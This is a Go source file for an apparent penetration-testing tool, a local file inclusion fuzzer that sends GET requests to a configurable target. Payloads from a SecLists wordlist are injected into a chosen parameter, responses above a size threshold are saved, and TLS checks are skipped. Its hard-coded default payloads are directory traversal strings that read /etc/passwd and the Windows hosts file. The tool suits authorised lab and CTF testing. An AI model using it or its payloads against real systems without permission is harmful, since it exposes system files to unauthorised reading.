package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	cf "github.com/thepcn3rd/goAdvsCommonFunctions"
)

// /home/thepcn3rd/hackthebox/SecLists/Fuzzing/LFI

// Future Enhancements
// Currently supports the GET method but not the POST

type Configuration struct {
	DestinationURL  string           `json:"destinationURL"`
	Method          string           `json:"method"`
	UserAgent       string           `json:"userAgent"`
	DelayBetweenReq int              `json:"delayBetweenRequests"`
	TargetKey       string           `json:"targetKey"`
	KeyValuePairs   []KeyValueStruct `json:"keyValuePairs"`
	OutputDirectory string           `json:"outputDirectory"`
	PayloadType     string           `json:"payloadType"`
	PayloadFilename string           `json:"payloadFilename"`
	PayloadList     []string         `json:"payloadList"`
	BodySize        int              `json:"bodySize"`
}

type KeyValueStruct struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func (c *Configuration) CreateConfig() error {
	c.DestinationURL = "https://127.0.0.1:9000/download.php"
	c.Method = "GET"
	c.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	c.DelayBetweenReq = 0
	c.TargetKey = "file"
	var keyPair KeyValueStruct
	keyPair.Key = "test"
	keyPair.Value = "testing"
	c.KeyValuePairs = append(c.KeyValuePairs, keyPair)
	// If a blank key value pair is present then it will stop reading them
	keyPair.Key = ""
	keyPair.Value = ""
	c.KeyValuePairs = append(c.KeyValuePairs, keyPair)
	c.OutputDirectory = "output"
	c.PayloadType = "File"
	c.PayloadFilename = "./github/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
	c.PayloadList = append(c.PayloadList, "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts")
	c.PayloadList = append(c.PayloadList, "../../../../etc/passwd")
	c.PayloadList = append(c.PayloadList, "..%2F..%2F..%2Fetc%2Fpasswd")
	c.BodySize = 200

	jsonData, err := json.MarshalIndent(c, "", "    ")
	if err != nil {
		return err
	}

	err = os.WriteFile("config.json", jsonData, 0644)
	if err != nil {
		return err
	}

	return nil
}

func (c *Configuration) LoadConfig(cPtr string) error {
	configFile, err := os.Open(cPtr)
	if err != nil {
		return err
	}
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	if err := decoder.Decode(&c); err != nil {
		return err
	}

	return nil
}

func (c *Configuration) PayloadListFromFile() error {
	var payloadList []string
	file, err := os.Open(c.PayloadFilename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		line = strings.Replace(line, "\n", "", -1)
		line = strings.Replace(line, "\r", "", -1)
		if len(line) > 0 {
			payloadList = append(payloadList, line)
		}
	}

	c.PayloadList = payloadList

	return nil
}

func displayTimeStamp() {
	currentTime := time.Now()
	formattedTime := currentTime.Format("2006-01-02 15:15:15")
	fmt.Println("Date/Time: ", formattedTime)
}

func main() {
	var config Configuration
	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	fmt.Println("Loading the following config file: " + *ConfigPtr + "\n")
	if err := config.LoadConfig(*ConfigPtr); err != nil {
		fmt.Println("Could not load the configuration file, creating a new default config.json")
		config.CreateConfig()
		log.Fatalf("Modify the config.json file to customize how the tool functions: %v\n", err)
	}

	// Verify the URL is correctly formatted
	baseURL, err := url.Parse(config.DestinationURL)
	if err != nil {
		log.Fatalf("Failed to parse target URL in config.json: %v\n", err)
	}

	// Add a timeout to the client of 10 seconds
	client := http.Client{Timeout: 10 * time.Second}
	client.Get(config.DestinationURL)
	cf.CreateDirectory("/" + config.OutputDirectory)
	// For the design refer to the headlessScreenshot program
	if config.PayloadType == "File" {
		if err := config.PayloadListFromFile(); err != nil {
			log.Fatalf("Unable to Load Payload List from File %v\n", err)
		}
	}

	displayTimeStamp()

	for count, payload := range config.PayloadList {

		query := baseURL.Query()
		query.Set(config.TargetKey, payload)
		for _, item := range config.KeyValuePairs {
			if item.Key != "" {
				query.Set(item.Key, item.Value)
			}
		}
		// The below URL Encodes the strings and the payload
		//baseURL.RawQuery = query.Encode()
		var queryParts []string
		for key, values := range query {
			for _, value := range values {
				queryParts = append(queryParts, fmt.Sprintf("%s=%s", key, value))
			}
		}

		queryString := strings.Join(queryParts, "&")
		urlString := config.DestinationURL + "?" + queryString
		// Manually construct the query string
		//values := url.Values{}
		//values.Add(config.TargetKey, payload)

		// Skip the verification of a self-signed certificate
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
		request, err := http.NewRequest(config.Method, urlString, nil)
		cf.CheckError("Unable to prepare HTTP GET Request", err, true)
		request.Header.Set("User-Agent", config.UserAgent)

		client := &http.Client{}
		//response, err := http.Get(baseURL.String())
		response, err := client.Do(request)
		if err != nil {
			log.Printf("Error visiting URL with the payload %s: %v\n\n", baseURL.String(), err)
			continue
		}
		defer response.Body.Close()

		body, err := io.ReadAll(response.Body)
		if err != nil {
			log.Fatalf("Failed to read the response body: %v", err)
		}

		// Measure the size of the body
		bodySize := len(body)

		///fmt.Printf("%d: Testing %s - Status: %d - Length: %d\n", count, baseURL.String(), response.StatusCode, bodySize)
		if bodySize > config.BodySize {
			now := time.Now()
			formattedDate := now.Format("01-02-2006_15:04")
			fileName := config.OutputDirectory + "/saved_" + strconv.Itoa(count) + "_" + formattedDate + ".output"
			cf.SaveOutputFile(string(body), fileName)
		}

		// Introduce a delay to not cause a Denial of Service
		time.Sleep(time.Duration(config.DelayBetweenReq) * time.Second)
	}

	displayTimeStamp()

	// Start testing directory traversal
	//testDirectoryTraversal(targetURL)
}
